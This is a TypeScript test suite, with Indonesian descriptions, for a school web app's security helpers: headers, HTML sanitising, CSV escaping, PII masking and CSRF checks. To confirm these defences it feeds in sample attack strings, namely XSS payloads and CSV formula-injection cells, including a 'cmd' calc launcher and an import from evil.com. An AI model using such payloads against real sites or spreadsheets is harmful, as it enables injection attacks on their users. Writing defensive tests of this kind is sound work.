import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  SECURITY_HEADERS,
  applySecurityHeaders,
} from "../src/lib/security/headers.ts";
import {
  escapeHtml,
  sanitizeInput,
  sanitizeObject,
  sanitizeCsvCell,
  maskNIK,
  maskPhone,
  maskEmail,
} from "../src/lib/security/sanitize.ts";
import { validateSameOrigin } from "../src/lib/security/csrf.ts";
import {
  apiSuccess,
  apiCreated,
  apiBadRequest,
  apiUnauthorized,
  apiForbidden,
  apiNotFound,
  apiTooManyRequests,
  apiInternalError,
  handleApiError,
} from "../src/lib/api-response.ts";
import { AuthorizationError } from "../src/lib/auth/rbac.ts";
import { ZodError } from "zod";

describe("OWASP Security Headers (A05: Security Misconfiguration)", () => {
  it("harus menyertakan seluruh header keamanan esensial OWASP", () => {
    const headerKeys = SECURITY_HEADERS.map((h) => h.key);
    assert.ok(headerKeys.includes("X-Frame-Options"));
    assert.ok(headerKeys.includes("X-Content-Type-Options"));
    assert.ok(headerKeys.includes("Referrer-Policy"));
    assert.ok(headerKeys.includes("Permissions-Policy"));
    assert.ok(headerKeys.includes("Strict-Transport-Security"));
    assert.ok(headerKeys.includes("Content-Security-Policy"));
  });

  it("harus menerapkan security headers ke Headers instance", () => {
    const headers = new Headers();
    applySecurityHeaders(headers);

    assert.equal(headers.get("X-Frame-Options"), "DENY");
    assert.equal(headers.get("X-Content-Type-Options"), "nosniff");
    assert.ok(headers.get("Content-Security-Policy")?.includes("default-src 'self'"));
  });
});

describe("OWASP Sanitization & XSS Mitigation (A03: Injection)", () => {
  it("harus melakukan escape terhadap karakter berbahaya HTML", () => {
    const malicious = `<script>alert("XSS")</script>`;
    const escaped = escapeHtml(malicious);
    assert.ok(!escaped.includes("<script>"));
    assert.ok(escaped.includes("&lt;script&gt;"));
    assert.ok(escaped.includes("&quot;XSS&quot;"));
  });

  it("harus membersihkan script dan pseudo-protocol javascript:", () => {
    const payload = `javascript:alert('pwned')`;
    const sanitized = sanitizeInput(payload);
    assert.ok(!sanitized.toLowerCase().includes("javascript:"));
  });

  it("harus mampu melakukan sanitasi rekursif pada objek input", () => {
    const body = {
      name: "<b>Budi Santoso</b>",
      nested: {
        note: `<img src=x onerror=alert(1)>`,
      },
    };
    const cleaned = sanitizeObject(body);
    assert.ok(!cleaned.name.includes("<"));
    assert.ok(!cleaned.nested.note.includes("<"));
  });
});

describe("Anti-CSV Formula Injection (CWE-1236)", () => {
  it("harus menyematkan tanda kutip tunggal untuk karakter pemicu formula spreadsheet", () => {
    const formula1 = "=cmd|' /C calc'!A0";
    const formula2 = "+SUM(A1:A10)";
    const formula3 = "-100";
    const formula4 = "@import('http://evil.com')";
    const normalText = "Ahmad Rayhan Pratama";

    assert.equal(sanitizeCsvCell(formula1), `"'=cmd|' /C calc'!A0"`);
    assert.equal(sanitizeCsvCell(formula2), `"'+SUM(A1:A10)"`);
    assert.equal(sanitizeCsvCell(formula3), `"'-100"`);
    assert.equal(sanitizeCsvCell(formula4), `"'@import('http://evil.com')"` );
    assert.equal(sanitizeCsvCell(normalText), `"Ahmad Rayhan Pratama"`);
  });
});

describe("Perlindungan Data Sensitif & PII Masking", () => {
  it("harus menyensor NIK dengan pola 4 digit awal dan 4 digit akhir", () => {
    const masked = maskNIK("3201234567890001");
    assert.equal(masked, "3201********0001");
  });

  it("harus menyensor nomor telepon dengan aman", () => {
    const masked = maskPhone("081234567890");
    assert.equal(masked, "0812****7890");
  });

  it("harus menyensor email pengguna", () => {
    const masked = maskEmail("admin@sdharapanbangsa.sch.id");
    assert.equal(masked, "a***n@sdharapanbangsa.sch.id");
  });
});

describe("OWASP CSRF & Same-Origin Validation", () => {
  it("harus mengizinkan request GET tanpa pengecekan origin", () => {
    const fakeReq = {
      method: "GET",
      headers: new Headers(),
    } as any;
    const result = validateSameOrigin(fakeReq);
    assert.equal(result.isValid, true);
  });

  it("harus meloloskan mutasi jika Origin cocok dengan Host", () => {
    const headers = new Headers();
    headers.set("host", "sdharapanbangsa.sch.id");
    headers.set("origin", "https://sdharapanbangsa.sch.id");

    const fakeReq = {
      method: "POST",
      headers,
    } as any;
    const result = validateSameOrigin(fakeReq);
    assert.equal(result.isValid, true);
  });

  it("harus MEMBLOKIR mutasi jika Origin berasal dari domain luar", () => {
    const headers = new Headers();
    headers.set("host", "sdharapanbangsa.sch.id");
    headers.set("origin", "https://evil-attacker.com");

    const fakeReq = {
      method: "POST",
      headers,
    } as any;
    const result = validateSameOrigin(fakeReq);
    assert.equal(result.isValid, false);
    assert.ok(result.reason?.includes("Origin tidak cocok"));
  });
});

describe("Clean Code Standardized API Responses", () => {
  it("harus menghasilkan response apiSuccess dengan status 200", async () => {
    const res = apiSuccess({ count: 5 });
    assert.equal(res.status, 200);
    const body = await res.json();
    assert.equal(body.success, true);
    assert.equal(body.data.count, 5);
  });

  it("harus menghasilkan response apiCreated dengan status 201", async () => {
    const res = apiCreated({ id: "item-1" });
    assert.equal(res.status, 201);
    const body = await res.json();
    assert.equal(body.success, true);
  });

  it("harus menghasilkan response status 400, 401, 403, 404, 429", async () => {
    assert.equal(apiBadRequest().status, 400);
    assert.equal(apiUnauthorized().status, 401);
    assert.equal(apiForbidden().status, 403);
    assert.equal(apiNotFound().status, 404);
    assert.equal(apiTooManyRequests().status, 429);
  });

  it("harus menangani AuthorizationError melalui handleApiError", async () => {
    const authErr = new AuthorizationError("Dilarang mengakses", 403, "IDOR_BLOCKED");
    const res = handleApiError(authErr);
    assert.equal(res.status, 403);
    const body = await res.json();
    assert.equal(body.success, false);
    assert.equal(body.code, "IDOR_BLOCKED");
  });
});
